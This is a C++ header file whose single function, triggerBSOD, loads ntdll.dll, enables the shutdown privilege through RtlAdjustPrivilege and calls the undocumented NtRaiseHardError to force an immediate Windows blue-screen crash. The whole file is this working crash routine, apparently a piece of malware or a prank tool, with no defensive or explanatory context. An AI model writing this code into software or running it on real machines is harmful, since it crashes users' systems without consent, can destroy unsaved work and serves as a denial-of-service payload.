#pragma once

#include <Windows.h>
#include <winternl.h>

typedef NTSTATUS(NTAPI* NtRaiseHardError)(NTSTATUS errorStatus, ULONG numberOfParameter, ULONG unicodeStringParameterMask OPTIONAL, PULONG_PTR parameter, ULONG responseOption, PULONG response);
typedef NTSTATUS(NTAPI* RtlAdjustPrivilege)(ULONG privilege, BOOLEAN enable, BOOLEAN currentThread, PBOOLEAN enablePointer);

const char* TARGET_DLL = "ntdll.dll";

bool triggerBSOD() {
	BOOLEAN enable;
	ULONG response;

	HMODULE libarary = LoadLibraryA(TARGET_DLL);
	if (libarary == NULL) {
		return false;
	}

	LPVOID rtlAdjustPrivilegeFunctionPointer = GetProcAddress(libarary, "RtlAdjustPrivilege");
	LPVOID ntRaiseHardErrorFunctionPointer = GetProcAddress(libarary, "NtRaiseHardError");

	RtlAdjustPrivilege rtlAdjustPrivilege = (RtlAdjustPrivilege)rtlAdjustPrivilegeFunctionPointer;
	NtRaiseHardError ntRaiseHardError = (NtRaiseHardError)ntRaiseHardErrorFunctionPointer;

	rtlAdjustPrivilege(19, TRUE, FALSE, &enable);
	ntRaiseHardError(STATUS_FLOAT_MULTIPLE_FAULTS, 0, 0, 0, 6, &response);
	return true;
}